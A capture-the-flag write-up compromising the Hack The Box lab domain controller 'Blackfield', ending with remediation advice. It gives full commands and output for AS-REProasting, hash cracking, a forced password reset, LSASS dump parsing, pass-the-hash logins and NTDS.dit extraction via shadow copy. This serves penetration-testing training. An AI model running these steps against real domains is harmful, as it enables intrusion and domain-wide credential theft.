---
title: "Hack The Box: Blackfield"
date: 2026-01-30
summary: "A Hard Windows-based domain controller compromised through an AS-REProasting attack, leveraging guest SMB access to enumerate users and reset a password, then abusing delegated permissions to access an LSASS dump. Privileges are escalated by exploiting backup rights to extract the NTDS.dit and SYSTEM hive, allowing recovery of the Domain Administrator hash."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Hard"
link: "https://app.hackthebox.com/machines/Blackfield"
tags:
  - ace-forcechangepassword
  - active-directory
  - asreproasting
  - bloodhound
  - bloodhound-ce-python
  - diskshadow
  - evil-winrm
  - impacket-getnpusers
  - impacket-secretsdump
  - john
  - net-rpc
  - netexec
  - nmap
  - ntds-dit
  - null-guest-authentication
  - pypykatz
  - reg
  - robocopy
  - sebackupprivilege
  - shadow-copy
  - smbclient
  - unix2dos
---

### Executive Summary
The **BLACKFIELD.local** Domain Controller was fully compromised through a chain of configuration weaknesses. The attack originated with **Guest SMB access**, which allowed the attacker to enumerate users and perform an **AS-REProasting** attack to compromise the `support` account. Abusing delegated privileges, the attacker reset the password for `audit2020`, gaining access to a forensic share containing an exposed **LSASS memory dump**. Credentials extracted from this dump granted access to the `svc_backup` account, where the attacker exploited the **SeBackupPrivilege** to dump the Active Directory database (NTDS.dit), ultimately recovering the Domain Administrator hash and achieving total control.

### Provided Information

Attacker IP: 10.10.14.113

Target IP: 10.129.229.17

### Nmap Scan

```bash
$ nmap -sCV -vv -oN nmap/top-tcp 10.129.229.17
Nmap scan report for 10.129.229.17
Host is up, received echo-reply ttl 127 (0.21s latency).
Scanned at 2026-01-30 01:26:35 EST for 76s
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-30 13:26:55Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29469/tcp): CLEAN (Timeout)
|   Check 2 (port 2922/tcp): CLEAN (Timeout)
|   Check 3 (port 46070/udp): CLEAN (Timeout)
|   Check 4 (port 52204/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-01-30T13:27:09
|_  start_date: N/A
|_clock-skew: 6h59m59s

<SNIP>
```

The target is a domain controller (DC) given the identified open ports.

Let’s generate a hosts file:

```bash
$ nxc smb 10.129.229.17 -u guest -p '' --generate-hosts-file hosts
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest:

$ cat hosts | sudo tee -a /etc/hosts
10.129.229.17     DC01.BLACKFIELD.local BLACKFIELD.local DC01
```

### Enumerating SMB

Let’s start by enumerating available SMB shares accessible with guest/null authentication:

```bash
$ nxc smb 10.129.229.17 -u '' -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\:
SMB         10.129.229.17   445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

$ nxc smb 10.129.229.17 -u guest -p '' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\guest:
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON                        Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL                          Logon server share
```

Null account can’t enumerate shares, while guest account can and is able to read the `profiles$` share.

Let’s check out its contents:

```bash
$ smbclient \\\\10.129.229.17\\profiles$ -U guest%
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun  3 12:47:12 2020
  ..                                  D        0  Wed Jun  3 12:47:12 2020
  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
  AChampken                           D        0  Wed Jun  3 12:47:11 2020
  <VERY LONG SNIP>
```

This share seems to hold home directories for users in the domain.

However, these may or may not be usernames of users in the domain.

Let’s also check domain users with RID brute forcing:

```bash
$ nxc smb 10.129.229.17 -u guest -p '' --rid-brute > rid_output.txt

$ cat rid_output.txt | grep -i sidtypeuser | cut -d \\ -f 2 | cut -d ' ' -f 1 > rid_usernames.txt
```

```bash
$ cat rid_usernames.txt | wc -l
333

$ cat rid_usernames.txt | head
Administrator
Guest
krbtgt
DC01$
audit2020
support
BLACKFIELD764430
BLACKFIELD538365
BLACKFIELD189208
BLACKFIELD404458
```

That’s a lot of usernames.

### AS-REProasting and Exploiting Support

Let’s attempt AS-REProasting against the identified usernames:

```bash
$ impacket-GetNPUsers blackfield.local/ -usersfile rid_usernames.txt -outputfile asreproasting.hashes -dc-ip 10.129.229.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:e8b9e6<REDACTED>
[-] User BLACKFIELD764430 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BLACKFIELD538365 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User BLACKFIELD189208 doesn't have UF_DONT_REQUIRE_PREAUTH set
<VERY LONG SNIP>
```

So the user Support is AS-REProastable.

Let’s attempt to crack its identified hash:

```bash
$ john asreproasting.hashes -w=/usr/share/wordlists/rockyou.txt
<SNIP>
#00^Bl<REDACTED>  ($krb5asrep$23$support@BLACKFIELD.LOCAL)
<SNIP>
Session completed.
```

Nice. Let’s verify those credentials against the domain:

```bash
$ nxc smb 10.129.229.17 -u support -p '#00^Bl<REDACTED>'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^Bl<REDACTED>
```

Perfect.

### Recon Revisited - Bloodhound

Let’s collect data for `bloodhound`:

```bash
$ bloodhound-ce-python -d blackfield.local -u support -p '#00^Bl<REDACTED>' -ns 10.129.229.17 -c all --zip
<SNIP>
INFO: Done in 00M 49S
INFO: Compressing output into 20260130015721_bloodhound.zip
```

Then let’s run `bloodhound` and upload the collected data to it.

### Exploiting Audit2020

After marking Support as owned, the following path is identified:

![Figure 1](/assets/images/writeups/hack-the-box-blackfield/hack-the-box-blackfield-fig-2.png)

<figcaption class="blog-image-caption">Figure 1</figcaption>

Support can change the password of Audit2020.

Let’s do that:

```bash
$ net rpc password "audit2020" "password123###" -U "blackfield.local"/"support"%'#00^Bl<REDACTED>' -S "10.129.229.17"

$ nxc smb 10.129.229.17 -u audit2020 -p 'password123###'
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:password123###
```

Nice. Let’s check what shares can this account access:

```bash
$ nxc smb 10.129.229.17 -u audit2020 -p 'password123###' --shares
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:password123###
SMB         10.129.229.17   445    DC01             [*] Enumerated shares
SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
SMB         10.129.229.17   445    DC01             -----           -----------     ------
SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.17   445    DC01             C$                              Default share
SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.229.17   445    DC01             profiles$       READ
SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
```

Another interesting share is now readable.

Let’s check out its contents:

```bash
$ smbclient \\\\10.129.229.17\\forensic -U Audit2020%password123###
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Feb 23 08:03:16 2020
  ..                                  D        0  Sun Feb 23 08:03:16 2020
  commands_output                     D        0  Sun Feb 23 13:14:37 2020
  memory_analysis                     D        0  Thu May 28 16:28:33 2020
  tools                               D        0  Sun Feb 23 08:39:08 2020

                5102079 blocks of size 4096. 1693658 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
<VERY LONG SNIP>
```

### Exploiting Svc_backup

After navigating the files in the share, one file seems very interesting:

```bash
$ ls memory_analysis
conhost.zip  dllhost.zip  mmc.zip            sihost.zip       taskhostw.zip  WmiPrvSE.zip
ctfmon.zip   ismserv.zip  RuntimeBroker.zip  smartscreen.zip  winlogon.zip
dfsrs.zip    lsass.zip    ServerManager.zip  svchost.zip      wlms.zip
```

There is an LSASS memory dump, potentially holding credentials.

Let’s attempt unzipping the dump and extracting its contents:

```bash
$ unzip lsass.zip
Archive:  lsass.zip
  inflating: lsass.DMP

$ pypykatz lsa minidump lsass.DMP
INFO:pypykatz:Parsing file lsass.DMP
FILE: ======== lsass.DMP =======
== LogonSession ==
authentication_id 406458 (633ba)
session_id 2
username svc_backup
domainname BLACKFIELD
logon_server DC01
logon_time 2020-02-23T18:00:03.423728+00:00
sid S-1-5-21-4194615774-2175524697-3563712290-1413
luid 406458
        == MSV ==
                Username: svc_backup
                Domain: BLACKFIELD
                LM: NA
                NT: 9658d1<REDACTED>
```

The credentials of Svc_backup are exposed in the dump.

### RCE as Svc_backup

According to `bloodhound`, this user can WinRM:

![Figure 2](/assets/images/writeups/hack-the-box-blackfield/hack-the-box-blackfield-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

Let’s WinRM using the identified credentials and read `user.txt`:

```bash
$ evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1<REDACTED>

Evil-WinRM shell v3.7
<SNIP>
*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls

    Directory: C:\Users\svc_backup\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   2:26 PM             32 user.txt

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
3920bb<REDACTED>
```

### SeBackupPrivilege with SAM and SYSTEM → Fail

As seen in Figure 2, Svc_backup is not only part of the Remote Management Users group but also part of the Backup Operators group. This means that this user likely has the SeBackupPrivilege enabled.

Let’s verify that:

```bash
C:\Users\svc_backup\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

And it is indeed enabled.

Let’s save SAM and SYSTEM and download them to extract the Administrator’s hash:

```bash
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> reg.exe save hklm\sam C:\sam.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> reg.exe save hklm\system C:\system.save
The operation completed successfully.

*Evil-WinRM* PS C:\Users\svc_backup\Desktop> cd /

*Evil-WinRM* PS C:\> download sam.save

Info: Downloading C:\\sam.save to sam.save
Info: Download successful!

*Evil-WinRM* PS C:\> download system.save

Info: Downloading C:\\system.save to system.save
Info: Download successful!
```

```bash
$ impacket-secretsdump -sam sam.save -system system.save local
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:67ef90<REDACTED>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

Let’s validate those credentials:

```bash
$ nxc smb 10.129.229.17 -u Administrator -H 67ef90<REDACTED>
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [-] BLACKFIELD.local\Administrator:67ef90<REDACTED> STATUS_LOGON_FAILURE
```

Sadly, they aren’t valid.

### SeBackupPrivilege with NTDS → Success

Let’s backup the `NTDS.dit` file, transfer it to Linux, and extract all hashes from it.

First, let’s create a shadow copy of the drive (because normal copying of `NTDS.dit` isn’t allowed), through the following script saved as `script.txt` (you can save it on Linux and upload it to the target):

```bash
set verbose on
set context persistent nowriters
set metadata C:\Windows\Temp\test.cab
add volume c: alias cdrive
create
expose %cdrive% e:
```

We should also make it suitable with Windows before uploading it:

```bash
$ unix2dos script.txt
unix2dos: converting file script.txt to DOS format...
```

Now let’s upload it:

```bash
*Evil-WinRM* PS C:\users\svc_backup\desktop> upload script.txt
<SNIP>

Info: Upload successful!
```

And let’s use it to create a shadow copy on Windows:

```bash
*Evil-WinRM* PS C:\users\svc_backup\desktop> diskshadow /s ./script.txt
Microsoft DiskShadow version 1.0
<SNIP>
The shadow copy was successfully exposed as e:\.
->
```

Nice. Now let’s extract the file with `robocopy`:

```bash
*Evil-WinRM* PS C:\users\svc_backup\desktop> robocopy /b E:\Windows\ntds . ntds.dit

<SNIP>
```

After that, let’s download the NTDS file:

```bash
*Evil-WinRM* PS C:\users\svc_backup\desktop> download ntds.dit

Info: Downloading C:\users\svc_backup\desktop\ntds.dit to ntds.dit

Info: Download successful!
```

Finally, let’s extract the new (and hopefully valid) Administrator’s hash:

```bash
$ impacket-secretsdump -ntds ntds.dit -system system.save local | grep Administrator
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5<REDACTED>:::
<SNIP>
```

Nice. Let’s validate it:

```bash
$ nxc smb 10.129.229.17 -u Administrator -H 184fb5<REDACTED>
SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\Administrator:184fb5<REDACTED> (Pwn3d!)
```

Amazing.

### RCE as Administrator

Let’s WinRM to the target as Administrator and read `root.txt`:

```bash
$ evil-winrm -i 10.129.229.17 -u administrator -H 184fb5<REDACTED>

Evil-WinRM shell v3.7
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls

    Directory: C:\Users\Administrator\desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
-a----        11/5/2020   8:38 PM             32 root.txt

*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
4375a6<REDACTED>
```

---

## Business Impact

### Confidentiality

The entire user database (NTDS.dit) was exfiltrated, exposing passwords for all employees and service accounts. Sensitive forensic data was also left publicly readable.

### Integrity

The attacker demonstrated the ability to forcefully reset user passwords and now possesses the ability to modify system logs, plant backdoors, or alter data on any machine without detection.

### Availability

The attacker has the privileges to delete critical system files, disable services, or encrypt data, leading to indefinite downtime.

### Remediation

- Disable Guest Account: Block anonymous SMB access and user enumeration.
- Reset All Passwords: Force a domain-wide password reset; the `NTDS.dit` leak compromised every account.
- Clean Shares: Delete sensitive memory dumps (LSASS) from the `forensic` share.
- Enable Kerberos Pre-auth: Audit all accounts to prevent AS-REProasting.
- Revoke Delegation: Remove the `Support` user's ability to reset other user passwords.
- Audit Backup Operators: Remove `svc_backup` from the Backup Operators group to revoke `SeBackupPrivilege`.
- Monitor System Calls: Alert on `diskshadow.exe` or `robocopy` usage targeting `NTDS.dit`.
